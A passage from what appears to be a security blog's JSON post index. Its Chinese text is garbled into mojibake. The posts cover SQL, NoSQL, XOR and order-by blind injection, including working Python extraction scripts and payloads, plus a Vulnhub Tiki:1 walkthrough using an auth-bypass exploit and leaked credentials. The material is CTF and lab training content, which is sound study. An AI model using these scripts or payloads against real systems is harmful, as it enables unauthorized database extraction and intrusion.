row`ï¼Œå½“ifæˆç«‹æ—¶å°±ä¼šè¿”å›æ­£å¸¸é¡µé¢ï¼Œå¯ä»¥é€šè¿‡è¿”å›çš„æƒ…å†µæ¥åˆ¤æ–­ã€‚\n\n### rand()ç›²æ³¨\n\nåŸç†å’Œorder byå¤§å·®ä¸å·®ï¼Œå°±æ˜¯rand()ä¼šäº§ç”Ÿä¸€ä¸ª0-1ä¹‹é—´çš„éšæœºæ•°ï¼Œæˆ‘ä»¬ç»™ä¸€ä¸ªå›ºå®šçš„ç§å­å°±ä¼šç”Ÿæˆä¸€ä¸ªå›ºå®šçš„æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬æ§åˆ¶randçš„ç§å­å°±å¯ä»¥é€ æˆæ’åºçš„ç»“æœä¸åŒã€‚\n\næ¯”å¦‚ï¼š\n\n~~~\nrand(1)\nrand(0)\nrand(1=1)\nrand(lenth(database())=8)\n....\n~~~\n\n### #å’Œ$ç¬¦å·çš„åŒºåˆ«\n\n**#{}** \n\nä½¿ç”¨#{}æ„å‘³ç€ä½¿ç”¨çš„é¢„ç¼–è¯‘çš„è¯­å¥ï¼Œå³åœ¨ä½¿ç”¨jdbcæ—¶çš„preparedStatementï¼Œsqlè¯­å¥ä¸­å¦‚æœå­˜åœ¨å‚æ•°åˆ™ä¼šä½¿ç”¨?ä½œå ä½ç¬¦ï¼Œæˆ‘ä»¬çŸ¥é“è¿™ç§æ–¹å¼å¯ä»¥é˜²æ­¢sqlæ³¨å…¥ï¼Œå¹¶ä¸”åœ¨ä½¿ç”¨#{}æ—¶å½¢æˆçš„sqlè¯­å¥ï¼Œå·²ç»å¸¦æœ‰å¼•å·ï¼Œä¾‹ï¼Œselect * from table1 where id=#{id} åœ¨è°ƒç”¨è¿™ä¸ªè¯­å¥æ—¶æˆ‘ä»¬å¯ä»¥é€šè¿‡åå°çœ‹åˆ°æ‰“å°å‡ºçš„sqlä¸ºï¼šselect * from table1 where id='2' åŠ å…¥ä¼ çš„å€¼ä¸º2.ä¹Ÿå°±æ˜¯è¯´åœ¨ç»„æˆsqlè¯­å¥çš„æ—¶å€™æŠŠå‚æ•°é»˜è®¤ä¸ºå­—ç¬¦ä¸²ã€‚\n\n**${}**\n\nä½¿ç”¨${}æ—¶çš„sqlä¸ä¼šå½“åšå­—ç¬¦ä¸²å¤„ç†ï¼Œæ˜¯ä»€ä¹ˆå°±æ˜¯ä»€ä¹ˆï¼Œå¦‚ä¸Šè¾¹çš„è¯­å¥ï¼šselect * from table1 where id=${id} åœ¨è°ƒç”¨è¿™ä¸ªè¯­å¥æ—¶æ§åˆ¶å°æ‰“å°çš„ä¸ºï¼šselect * from table1 where id=2 ï¼Œå‡è®¾ä¼ çš„å‚æ•°å€¼ä¸º2\n\nä»ä¸Šè¾¹çš„ä»‹ç»å¯ä»¥çœ‹å‡ºè¿™ä¸¤ç§æ–¹å¼çš„åŒºåˆ«ï¼Œæˆ‘ä»¬æœ€å¥½æ˜¯èƒ½ç”¨#{}åˆ™ç”¨å®ƒï¼Œå› ä¸ºå®ƒå¯ä»¥é˜²æ­¢sqlæ³¨å…¥ï¼Œä¸”æ˜¯é¢„ç¼–è¯‘çš„ï¼Œåœ¨éœ€è¦åŸæ ·è¾“å‡ºæ—¶æ‰ä½¿ç”¨${}ï¼Œå¦‚ï¼Œ\n\nselect * from ${tableName} order by ${id} è¿™é‡Œéœ€è¦ä¼ å…¥è¡¨åå’ŒæŒ‰ç…§å“ªä¸ªåˆ—è¿›è¡Œæ’åº ï¼ŒåŠ å…¥ä¼ å…¥table1ã€id åˆ™è¯­å¥ä¸ºï¼šselect * from table1 order by id\n\nå¦‚æœæ˜¯ä½¿ç”¨#{} åˆ™å˜æˆäº†select * from 'table1' order by 'id' æˆ‘ä»¬çŸ¥é“è¿™æ ·å°±ä¸å¯¹äº†ã€‚\n\nå¦ï¼Œåœ¨ä½¿ç”¨ä»¥ä¸‹çš„é…ç½®æ—¶ï¼Œå¿…é¡»ä½¿ç”¨#{}\n\n```\n<select id=\"selectMessageByIdI\" parameterType=\"int\" resultType=\"Message\">\n         \n         select * from message where id=#{id};\n     </select>\n```\n\nåœ¨parameterTypeæ˜¯intæ—¶ï¼Œsqlè¯­å¥ä¸­å¿…é¡»æ˜¯#{}ã€‚\n\n## å‚è€ƒé“¾æ¥\n\n [å…³äºJavaä¸­order byæ³¨å…¥è¯¦è§£](https://www.freebuf.com/articles/web/360733.html)\n","tags":["web","sql"],"categories":["web","java"]},{"title":"NoSQLæ³¨å…¥","url":"/2024/03/12/NoSQLæ³¨å…¥/","content":"\n\n\n\n\n\n\n## ä»€ä¹ˆæ˜¯NoSQL\n\nNoSQLï¼ŒæŒ‡çš„æ˜¯éå…³ç³»å‹çš„æ•°æ®åº“ã€‚NoSQL æœ‰æ—¶ä¹Ÿç§°ä½œ Not Only SQL çš„ç¼©å†™ï¼Œæ˜¯å¯¹ä¸åŒäºä¼ ç»Ÿçš„[å…³ç³»å‹æ•°æ®åº“](https://cloud.tencent.com/product/cdb-overview?from_column=20065&from=20065)çš„[æ•°æ®åº“ç®¡ç†](https://cloud.tencent.com/product/dbbrain?from_column=20065&from=20065)ç³»ç»Ÿçš„ç»Ÿç§°ã€‚NoSQL ç”¨äºè¶…å¤§è§„æ¨¡æ•°æ®çš„å­˜å‚¨ã€‚ï¼ˆä¾‹å¦‚è°·æ­Œæˆ– Facebook æ¯å¤©ä¸ºä»–ä»¬çš„ç”¨æˆ·æ”¶é›†ä¸‡äº¿æ¯”ç‰¹çš„æ•°æ®ï¼‰ã€‚è¿™äº›ç±»å‹çš„æ•°æ®å­˜å‚¨ä¸éœ€è¦å›ºå®šçš„æ¨¡å¼ï¼Œæ— éœ€å¤šä½™æ“ä½œå°±å¯ä»¥æ¨ªå‘æ‰©å±•ã€‚\n\n---\n\n\n\nNoSQL æä¾›äº†æ–°çš„æ•°æ®æ¨¡å‹å’ŒæŸ¥è¯¢æ ¼å¼ï¼Œä»è€Œå¯ä»¥è§„é¿å¸¸è§„çš„ SQL æ³¨å…¥æ”»å‡»ã€‚ä½†æ˜¯ï¼Œå®ƒä»¬ä¹Ÿä¸ºæ”»å‡»è€…æä¾›äº†æ’å…¥æ¶æ„ä»£ç çš„æ–°æ–¹æ³•ã€‚æ€»çš„æ¥è®²æœ‰å››ç§æ³¨å…¥æ‰‹æ³•ï¼š\n\n**1ã€é‡è¨€å¼**\n\nåˆç§°ä¸ºæ°¸çœŸå¼ï¼ˆè¿™ä¸ªå¥½åƒæ˜¯æ•°ç†é€»è¾‘é‡Œé¢çš„æœ¯è¯­ï¼‰ï¼Œæ­¤ç±»æ”»å‡»æ˜¯åœ¨æ¡ä»¶è¯­å¥ä¸­æ³¨å…¥ä»£ç ï¼Œä½¿ç”Ÿæˆçš„è¡¨è¾¾å¼åˆ¤å®šç»“æœæ°¸è¿œä¸ºçœŸï¼Œä»è€Œç»•è¿‡è®¤è¯æˆ–è®¿é—®æœºåˆ¶ã€‚\n\n**2ã€è”åˆæŸ¥è¯¢**\n\nè”åˆæŸ¥è¯¢æ˜¯ä¸€ç§ä¼—æ‰€å‘¨çŸ¥çš„SQLæ³¨å…¥æŠ€æœ¯ï¼Œæ”»å‡»è€…åˆ©ç”¨ä¸€ä¸ªè„†å¼±çš„å‚æ•°å»æ”¹å˜ç»™å®šæŸ¥è¯¢è¿”å›çš„æ•°æ®é›†ã€‚è”åˆæŸ¥è¯¢æœ€å¸¸ç”¨çš„ç”¨æ³•æ˜¯ç»•è¿‡è®¤è¯é¡µé¢è·å–æ•°æ®ã€‚\n\n**3ã€JavaScript æ³¨å…¥**\n\nMongoDB Server æ”¯æŒ JavaScriptï¼Œè¿™ä½¿å¾—åœ¨æ•°æ®å¼•æ“è¿›è¡Œå¤æ‚äº‹åŠ¡å’ŒæŸ¥è¯¢æˆä¸ºå¯èƒ½ï¼Œä¼ é€’ä¸å¹²å‡€çš„ç”¨æˆ·è¾“å…¥åˆ°è¿™äº›æŸ¥è¯¢ä¸­å¯ä»¥æ³¨å…¥ä»»æ„ JavaScript ä»£ç ï¼Œå¯¼è‡´éæ³•çš„æ•°æ®è·å–æˆ–ç¯¡æ”¹ã€‚\n\n**4ã€ç›²æ³¨**\n\nå½“é¡µé¢æ²¡æœ‰å›æ˜¾æ—¶ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥é€šè¿‡`$regex`æ­£åˆ™è¡¨è¾¾å¼æ¥è¾¾åˆ°å’Œ SQL æ³¨å…¥ä¸­`substr()`å‡½æ•°ç›¸åŒçš„åŠŸèƒ½ï¼Œè€Œä¸” NoSQL ç”¨åˆ°çš„åŸºæœ¬ä¸Šéƒ½æ˜¯å¸ƒå°”ç›²æ³¨ã€‚\n\n---\n\nå¯¹äº PHP æœ¬èº«çš„ç‰¹æ€§è€Œè¨€ï¼Œç”±äºå…¶æ¾æ•£çš„æ•°ç»„ç‰¹æ€§ï¼Œå¯¼è‡´å¦‚æœæˆ‘ä»¬è¾“å…¥`value=1`é‚£ä¹ˆï¼Œä¹Ÿå°±æ˜¯è¾“å…¥äº†ä¸€ä¸ª value çš„å€¼ä¸º 1 çš„æ•°æ®ã€‚å¦‚æœè¾“å…¥`value[$ne]=1`ä¹Ÿå°±æ„å‘³ç€`value=array($ne=>1)`,åœ¨ MongoDB ä¸­ï¼ŒåŸæ¥çš„ä¸€ä¸ªå•ä¸ªç›®æ ‡çš„æŸ¥è¯¢å˜æˆäº†æ¡ä»¶æŸ¥è¯¢ã€‚åŒæ ·çš„ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ä½¿ç”¨`username[$gt]=&password[$gt]=`ä½œä¸º payload è¿›è¡Œæ”»å‡»ã€‚\n\nåœ¨æˆ‘çœ‹æ¥ï¼Œnosqlæ³¨å…¥å°±æ˜¯é€šè¿‡ä¼ å…¥æ•°ç»„ç„¶åæ‹¼æ¥æ¶æ„è¯­å¥é€ æˆæ³¨å…¥ï¼Œå’Œå…¶ä»–æ•°æ®åº“çš„æ³¨å…¥åŸç†ç±»ä¼¼ï¼Œä½†æ˜¯è¯­æ³•æœ‰æ‰€ä¸åŒã€‚\n\n[æŸ¥è¯¢æ“ä½œç¬¦](https://blog.csdn.net/dyllove98/article/details/8990940)\n\nnosqlçš„æŸ¥è¯¢æ“ä½œç¬¦ä¸ç”¨`orã€andã€=`ç­‰ç­‰ï¼Œå–è€Œä»£ä¹‹çš„æ˜¯`$eqã€$neã€$gt`ç­‰\n\n| æ–¹æ³•å | æè¿°     |\n| ------ | -------- |\n| $gt    | å¤§äº     |\n| $lte   | å°äºç­‰äº |\n| $in    | åŒ…å«     |\n| $nin   | ä¸åŒ…å«   |\n| $lt    | å°äº     |\n| $gte   | å¤§äºç­‰äº |\n| $ne    | ä¸ç­‰äº   |\n| $eq    | ç­‰äº     |\n\n| $and | ä¸                                                           |\n| ---- | ------------------------------------------------------------ |\n| $nor | $noråœ¨NORä¸€ä¸ªæˆ–å¤šä¸ªæŸ¥è¯¢è¡¨è¾¾å¼çš„æ•°ç»„ä¸Šæ‰§è¡Œé€»è¾‘è¿ç®—ï¼Œå¹¶é€‰æ‹© å¯¹è¯¥æ•°ç»„ä¸­æ‰€æœ‰æŸ¥è¯¢è¡¨è¾¾å¼éƒ½å¤±è´¥çš„æ–‡æ¡£ |\n| $not | ååŒ¹é…(1.3.3åŠä»¥ä¸Šç‰ˆæœ¬),å­—æ®µå€¼ä¸åŒ¹é…è¡¨è¾¾å¼æˆ–è€…å­—æ®µå€¼ä¸å­˜åœ¨   |\n| $or  | æˆ–                                                           |\n\nä¾‹å¦‚ï¼š\n\næˆ‘ä»¬ä¼ å…¥`username=admin&password=123456`\n\nåç«¯å°±ä¼šå¤„ç†æˆ\n\n~~~\narray(\n'username' => 'admin',\n'password' => '123456'\n)\n~~~\n\nå¦‚æœæˆ‘ä»¬ä¼ å…¥`username[$ne]=1&password[$ne]=1`\n\nåç«¯å¤„ç†æˆ\n\n~~~\narray(\n'username' => array('$ne' => 1),\n'password' => array('$ne' => 1)\n)\n~~~\n\næŸ¥è¯¢çš„è¯­å¥å°±ä¼šå˜æˆ`db.users.find({'username':{$ne:1}, 'password':{$ne:1}})`\n\næ„æ€å°±æ˜¯æŸ¥è¯¢usernameä¸ç­‰äº1ï¼Œpasswordä¸ç­‰äº1çš„ç”¨æˆ·\n\næ­¤å¤–,nosqlè¿˜å¯ä»¥è¿›è¡Œjavascripæ³¨å…¥\n\nä¾‹å¦‚ï¼š`db.users.find( { $where: function() { return this.username == 'admin'; } } )`\n\nè¯¥æŸ¥è¯¢è¿”å›åœ¨usersé›†åˆä¸­usernameç­‰äºadminçš„æ‰€æœ‰æ–‡æ¡£ã€‚\n\n\n\n## å‚è€ƒé“¾æ¥\n\n[ä»é›¶å­¦ä¹  NoSQL æ³¨å…¥ä¹‹ Mongodb](https://cloud.tencent.com/developer/article/1602092)\n\n[get-started-with-nosql-injection-nosqli](https://tcm-sec.com/get-started-with-nosql-injection-nosqli/)\n","tags":["web","sql"],"categories":["web"]},{"title":"sqlå¼‚æˆ–æ³¨å…¥","url":"/2024/03/01/sqlå¼‚æˆ–æ³¨å…¥/","content":"\n\n\n## sqlå¼‚æˆ–æ³¨å…¥\n\nå½“wafè¿‡æ»¤äº†å¾ˆå¤šä¸œè¥¿ï¼Œä½†æ˜¯æ²¡æœ‰è¿‡æ»¤å¼‚æˆ–(^)ç¬¦çš„æ—¶å€™ä½¿ç”¨ã€‚\n\n\n\n### ä»€ä¹ˆæ˜¯å¼‚æˆ–æ³¨å…¥\n\nå¼‚æ­¥æ³¨å…¥è¯´ç®€å•ä¸€ç‚¹å°±æ˜¯åœ¨æ„é€ whereåé¢çš„åˆ¤æ–­æ¡ä»¶æ—¶ä½¿ç”¨^ï¼ˆå¼‚æˆ–ç¬¦å·ï¼‰æ¥è¾¾åˆ°sqlæ³¨å…¥æ”»å‡»çš„ç›®çš„\n\n**1^1=0 1^0=1**\n\nå¼‚æˆ–æ³¨å…¥å°±æ˜¯åˆ©ç”¨sqlè¯­å¥æ¥è¿›è¡Œç›²æ³¨\n\nä¾‹å¦‚ï¼š\n\n```javascript\nselect * from student where Sname=1^(substr(database(),$å˜é‡1$,1)=$å˜é‡2$);\n```\n\nè¿™é‡Œå°±æ˜¯çœ‹æ•°æ®åº“çš„ç¬¬`å˜é‡1`ä¸ªå­—ç¬¦æ˜¯å¦ç­‰äº`å˜é‡2`ï¼Œå¦‚æœç›¸ç­‰å°±ä¼šå˜æˆ`1^1`è¿”å›çš„æ˜¯0ï¼Œæ‰€ä»¥æˆ‘ä»¬åº”è¯¥åœ¨æœ€åå†å¼‚æˆ–ä¸€ä¸ª1\n\n~~~sql\nselect * from student where Sname=1^(substr(database(),$å˜é‡1$,1)=$å˜é‡2$)^1;\n~~~\n\nè¿™æ ·å¦‚æœæ•°æ®åº“çš„ç¬¬`å˜é‡1`ä¸ªå­—ç¬¦ç­‰äº`å˜é‡2`å°±ä¼šè¿”å›1ï¼Œç„¶åå†é…åˆè„šæœ¬å®ç°å¼‚æˆ–æ³¨å…¥\n\n---\n\n\n\nè„šæœ¬:\n\n~~~\nimport requests\nimport time\n\nurl = \"\"\npay=''\ncolumn = \"\"\nfor i in range(1, 1000):\n    time.sleep(0.06)\n    low = 32\n    high = 128\n    mid = (low + high) // 2\n    while (low < high):\n        # åº“å\n        #temp[\"id\"] = \"1^(ascii(substr((select(group_concat(schema_name))from(information_schema.schemata)),%d,1))>%d)^1\" % (i, mid)\n        # è¡¨å\n        # temp[\"id\"] = \"1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),%d,1))>%d)^1\" %(i,mid)\n        # å­—æ®µå\n        # temp[\"id\"] = \"1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='F1naI1y')),%d,1))>%d)^1\" %(i,mid)\n        # å†…å®¹\n        pay = \"1^(ascii(substr((select(group_concat(password))from(F1naI1y)),%d,1))>%d)^1\" %(i,mid)\n        r = requests.get(url+pay)\n        time.sleep(0.04)\n        print(low, high, mid, \":\")\n        if \"Click\" in r.text:\t\t\t#è‡ªè¡Œæ›´æ”¹è¿”å›å­—ç¬¦\n            low = mid + 1\n        else:\n            high = mid\n        mid = (low + high) // 2\n    if (mid == 32 or mid == 127):\n        break\n    column += chr(mid)\n    print(column)\n\nprint(\"All:\", column)\n\n~~~\n\n","tags":["web","sql"],"categories":["web"]},{"title":"PHPè¯­æ³•æ„é€ å’Œå˜é‡å‡½æ•°","url":"/2024/02/29/PHPè¯­æ³•æ„é€ å’Œå˜é‡å‡½æ•°/","content":"\n\n\n\n\n\n\n\n\næ˜¨å¤©æˆ‘å‘ç°äº†ä¸€ä¸ªé—®é¢˜\n\n```php\n<?php\n$a='693741';\n$a=base_convert($a,10,36);\n$a(system(\"dir\"));\n```\n\n$aæ˜¯36è¿›åˆ¶çš„evalè½¬æ¢æˆçš„10è¿›åˆ¶\n\næ‰€ä»¥è¿™ä¸ªä»£ç å…¶å®å°±æ˜¯`eval(system(\"dir\"));`ï¼Œä½†æ˜¯è¿è¡Œçš„æ—¶å€™å´æŠ¥é”™äº†\n\n~~~\nPHP Fatal error:  Uncaught Error: Call to undefined function eval()\n~~~\n\nç„¶åå»ç½‘ä¸Šäº†è§£äº†æ‰çŸ¥é“\n\n**`eval` å±äºPHPè¯­æ³•æ„é€ çš„ä¸€éƒ¨åˆ†ï¼Œå¹¶ä¸æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œæ‰€ä»¥ä¸èƒ½é€šè¿‡ å˜é‡å‡½æ•° çš„å½¢å¼æ¥è°ƒç”¨`**\n\nç±»ä¼¼çš„è¯­æ³•æ„é€ è¿˜æœ‰ï¼š`echo`ï¼Œ`print`ï¼Œ`unset()`ï¼Œ`isset()`ï¼Œ`empty()`ï¼Œ`include`ï¼Œ`require`...\n\nå°±æ¯”å¦‚\n\n~~~\nprint \"asdasd\";\n>asdasd\n\nfunction  myprint($a)\n{\n    print $a;\n}\nmyprint \"asdasdasd\";\n>Parse error: syntax error, unexpected '\"asdasdasd\"' (T_CONSTANT_ENCAPSED_STRING)\n~~~\n\nç›´æ¥`print \"asdasd\"`å°±å¯ä»¥æ‰“å°å‡ºå­—ç¬¦ï¼Œä½†æ˜¯è‡ªå·±æ„é€ çš„å‡½æ•°å´æ²¡æœ‰åŠæ³•è¿™æ ·ã€‚\n\næ‰€ä»¥ç½‘ä¸Šæœ‰çš„ä¸€å¥è¯æœ¨é©¬æ¥è°ƒç”¨evalçš„å…¶å®éƒ½ä¸å¯ä»¥,æ¢æˆ`assert`å°±å¯ä»¥äº†ã€‚\n","tags":["web"],"categories":["web"]},{"title":"order by ç›²æ³¨","url":"/2024/02/11/order-by-ç›²æ³¨/","content":"\n# order byæ¯”è¾ƒå¤§å°ç›²æ³¨\n\n![](/pic/orderby1.png)\n\nè¿™æ˜¯è¡¨é‡Œçš„æ‰€æœ‰ä¸œè¥¿\n\nå¦‚æœæˆ‘ä»¬æ‰§è¡Œ`select * from flag where id='' or 1 union select 1,1 order by 2;`ä¼šå‡ºç°\n\n![](/pic/orderby2.png)\n\nä¸èƒ½ç”¨`and`å¦åˆ™å°±ç›¸å½“äºåˆ›å»ºäº†ä¸€ä¸ªè™šæ‹Ÿçš„è¡¨ï¼ŒæŸ¥è¯¢ä¸åˆ°åŸæ¥çš„æ•°æ®ã€‚\n\næˆ‘ä»¬çŸ¥é“flagçš„ç¬¬ä¸€ä½æ˜¯`f`ï¼Œå¦‚æœæˆ‘ä»¬æŸ¥è¯¢`select * from flag where id='' or 1 union select 1,'f' order by 2;`ä¼šå‘ç”Ÿä»€ä¹ˆå‘¢ï¼Ÿ\n\n![](/pic/orderby3.png)\n\nè¿˜æ˜¯è¿™æ ·ï¼Œç¬¬ä¸€è¡Œæ²¡ä»€ä¹ˆç”¨ï¼Œä½†æ˜¯å¦‚æœæˆ‘ä»¬æŸ¥è¯¢çš„æ˜¯`g`çš„è¯å°±ä¼šå˜æˆè¿™æ ·\n\n![](/pic/orderby4.png)\n\nflagçš„å€¼å°±ä¼šå‡ºç°åœ¨ç¬¬ä¸€è¡Œï¼Œæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹æ¥è¿›è¡Œorder byç›²æ³¨\n\nè„šæœ¬:\n\n~~~python\nimport requests\nimport string\nurl=\"http://4ef0329e-10b4-4bd1-bf0a-0d80fe83129d.challenge.ctf.show/\"\nstr=string.digits+string.ascii_letters\nflag=''\nj=''\nfor i in range(1,50):\n    for s in str:\n        data = {\n            'username': \"' or 1 union select 1,2,'{0}' order by 3#\".format(flag+s),\n            'password': '1111'\n        }\n        r=requests.post(url,data=data)\n        if \"</code>admin\" in r.text:\n            flag+=chr(ord(s)-1)\n            print(flag)\n            break;\n~~~\n\næ ¹æ®è„šæœ¬è‡ªè¡Œä¿®æ”¹\n","tags":["web","sql"],"categories":["web"]},{"title":"Tiki:1","url":"/2023/12/04/Tiki-1/","content":"\n# æè¿°\n\nå“¦ï¼Œä¸ï¼Œæˆ‘ä»¬çš„ç½‘ç»œæœåŠ¡å™¨å—åˆ°äº†æŸå®³ã€‚æ”»å‡»è€…ä½¿ç”¨äº†0dayï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸çŸ¥é“ä»–æ˜¯å¦‚ä½•è¿›å…¥ç®¡ç†é¢æ¿çš„ã€‚è°ƒæŸ¥ä¸€ä¸‹ã€‚\n\nè¿™æ˜¯ä¸€ä¸ª OSCP Prep Boxï¼Œå®ƒåŸºäºæˆ‘æœ€è¿‘å‘ç°çš„ CVEã€‚å®ƒä½äº OSCP å®éªŒå®¤æœºå™¨çº§åˆ«ã€‚\n\n# æ¸—é€è¿‡ç¨‹\n\né¦–å…ˆå°±æ˜¯ä¿¡æ¯æœé›†ï¼Œé¶æœºçš„ipç”¨nmapæˆ–è€…netdiscoveréƒ½å¯ä»¥\n\né¶æœºipï¼š192.168.56.102\n\nç„¶åæ‰«æä¸€ä¸‹å…¨éƒ¨çš„ç«¯å£\n\n`nmap -sS -p- 192.168.56.102 -T4 --min-rate 1000 -oN nmap.txt`\n\nç»“æœå¦‚ä¸‹ï¼š\n\n~~~\nPORT    STATE SERVICE\n22/tcp  open  ssh\n80/tcp  open  http\n139/tcp open  netbios-ssn\n445/tcp open  microsoft-ds\n~~~\n\nç„¶åæ‰«ä¸€ä¸‹ç«¯å£çš„ä¿¡æ¯ï¼Œå’ŒæœåŠ¡çš„ç‰ˆæœ¬\n\n`nmap -sV -sC -O -p22,80,139,445 192.168.56.102 `\n\n~~~\nPORT    STATE SERVICE     VERSION\n22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 a3d84a89a9256d07c53d762806edd1c0 (RSA)\n|   256 e7b289055457dc02f48c3a7c558b51aa (ECDSA)\n|_  256 fd77072b4a163a016be0000c0a36d82f (ED25519)\n80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))\n| http-robots.txt: 1 disallowed entry \n|_/tiki/\n|_http-server-header: Apache/2.4.41 (Ubuntu)\n|_http-toc: true\ntitle: Apache2 Ubuntu Default Page: It works\n139/tcp open  netbios-ssn Samba smbd 4.6.2\n445/tcp open  netbios-ssn Samba smbd 4.6.2\nMAC Address: 08:00:27:26:96:01 (Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose\nRunning: Linux 4.X|5.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\nOS details: Linux 4.15 - 5.6\nNetwork Distance: 1 hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nHost script results:\n|_clock-skew: 7h59m57s\n| smb2-security-mode: \n|   311: \n|_    Message signing enabled but not required\n|_nbstat: NetBIOS name: UBUNTU, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)\n| smb2-time: \n|   date: 2023-12-04T20:55:56\n|_  start_date: N/A\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 28.95 seconds\n\n~~~\n\nå¯ä»¥å‘ç°æœ‰`samba`æœåŠ¡ï¼Œå¯ä»¥å¯¹sambaè¿›è¡Œæšä¸¾\n\nç”¨`enum4linux`è·‘ä¸€ä¸‹å¯ä»¥æ‰¾åˆ°`silky`çš„ç”¨æˆ·,ç”¨smbclientåˆ—ä¸¾ä¸€ä¸‹å…±äº«çš„èµ„æº\n\n`smbclient -L IP`\n\n~~~\n\tSharename       Type      Comment\n\t---------       ----      -------\n\tprint$          Disk      Printer Drivers\n\tNotes           Disk      My Notes\n\tIPC$            IPC       IPC Service (ubuntu server (Samba, Ubuntu))\n\n~~~\n\nèƒ½æ‰¾åˆ°Notesï¼Œè¿æ¥ä¸€ä¸‹`smbclient //192.168.56.102/Notes`æœ‰ä¸€ä¸ªMail.txt\n\nä¸‹è½½ä¸‹æ¥æŸ¥çœ‹\n\n~~~\n#Mail.txt\nHi Silky\nbecause of a current Breach we had to change all Passwords,\nplease note that it was a 0day, we don't know how he made it.\n\nYour new CMS-password is now 51lky571k1, \nplease investigate how he made it into our Admin Panel.\n\nCheers Boss.\n\n~~~\n\nå¯ä»¥çœ‹åˆ°cmsçš„å¯†ç ï¼Œç™»å½•ä¹‹åæ²¡ä»€ä¹ˆç”¨ã€‚\n\næŸ¥çœ‹cmsæœ‰æ²¡æœ‰ä»€ä¹ˆå†å²æ¼æ´\n\n`searchsploit tiki cms`\n\n~~~\n---------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\n Exploit Title                                                                                                                                            |  Path\n---------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\nTiki Wiki CMS 15.0 - Arbitrary File Download                                                                                                              | php/webapps/40080.txt\nTiki Wiki CMS Calendar 6.15/9.11 LTS/12.5 LTS/14.2 - Remote Code Execution                                                                                | php/webapps/39965.txt\nTiki Wiki CMS Groupware - 'url' Open Redirection                                                                                                          | php/webapps/36848.txt\nTiki Wiki CMS Groupware 21.1 - Authentication Bypass                                                                                                      | php/webapps/48927.py\nTiki Wiki CMS Groupware 5.2 - Multiple Vulnerabilities                                                                                                    | php/webapps/15174.txt\nTiki Wiki CMS Groupware 7.2 - 'snarf_ajax.php' Cross-Site Scripting                                                                                       | php/webapps/35974.txt\nTiki Wiki CMS Groupware 8.1 - 'show_errors' HTML Injection                                                                                                | php/webapps/36470.txt\nTiki Wiki CMS Groupware 8.2 - 'snarf_ajax.php' Remote PHP Code Injection                                                                                  | php/webapps/18265.txt\nTiki Wiki CMS Groupware 8.3 - 'Unserialize()' PHP Code Execution                                                                                          | php/webapps/19573.php\nTiki Wiki CMS Groupware 8.3 - 'Unserialize()' PHP Code Execution (Metasploit)                                                                             | php/webapps/19630.rb\n---------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\nShellcodes: No Results\nPapers: No Results\n\n~~~\n\næŸ¥çœ‹webæœåŠ¡cmsçš„ç‰ˆæœ¬ç”¨dirsearchå¯ä»¥æ‰¾åˆ°ä¸€ä¸ªchangelog\n\nè®¿é—®å¯ä»¥çœ‹åˆ°ç‰ˆæœ¬ä¸º21.1ï¼Œæ­£å¥½æœ‰ä¸€ä¸ªå†å²æ¼æ´\n\nç”¨`searchsploit tiki cms -m 48927 `å°†è„šæœ¬ä¸‹è½½ä¸‹æ¥è¿è¡Œï¼Œé‡ç½®adminçš„å¯†ç ä¸ºç©º,ç„¶åç”¨adminç™»å½•bpæŠ“åŒ…ä¿®æ”¹ç™»å½•å¯†ç ä¸ºç©ºï¼ŒæˆåŠŸç™»å½•ã€‚åœ¨lastchangeçš„Credentialsé‡Œå¯ä»¥æ‰¾åˆ°`silky:Agy8Y7SPJNXQzqA `è¿™ä¸ªæ˜¯sshçš„å¯†ç ï¼Œç”¨sshè¿æ¥ï¼ŒæŸ¥çœ‹idï¼Œå‘ç°ç”¨æˆ·åœ¨soduç»„ä¸‹ï¼Œå¯ä»¥ç›´æ¥sudo suææƒã€‚\n\n# å°ç»“\t\t\n\nä¸€å¼€å§‹é¶åœºæ­å»ºçš„æ—¶å€™å‡ºäº†ç‚¹é—®é¢˜å¯¼è‡´å‘ç°ä¸äº†é¶æœºçš„åœ°å€ï¼Œæ˜¯å› ä¸ºæˆ‘çš„æ”»å‡»æœºå’Œé¶æœºä¸åœ¨ä¸€ä¸ªå±€åŸŸç½‘å†…ï¼Œå°†é¶æœºçš„ç½‘å¡å’Œæ”»å‡»æœºæ¡¥æ¥åœ¨ä¸€èµ·å°±å¯ä»¥äº†\n\nè®°å½•ä¸‹æ¥çš„åªæœ‰æ­£ç¡®çš„è·¯çº¿ï¼Œæ¸—é€è¿‡ç¨‹ä¸­è¿˜è¦å»è¯•ç€æ¢ç´¢å…¶ä»–çš„åŠŸèƒ½ç‚¹\n","tags":["vulnhub"],"categories":["boot2root"]},{"title":"1337_UP_LIVE_CTF 2023","url":"/2023/11/22/1337_up_live_Ctf/","content":"\n\n\n## CTFC\n\nåˆ·é¢˜çš„æ—¶å€™è§åˆ°è¿‡è¿™ç§é¢˜ï¼Œå…¶å®å°±æ˜¯æ³¨å…¥+çˆ†ç ´å˜›ï¼Œä½†ä¹‹å‰é‡åˆ°çš„æ˜¯sqlæ³¨å…¥çš„ï¼Œè¿™è¯´æ˜ç°åœ¨æ•°æ®åº“ç±»å‹è§çš„ä¸å¤š\n\né¢˜ç›®ç»™äº†ä¸€ä¸ªé™„ä»¶\n\n~~~python\n#app.py\nfrom flask import 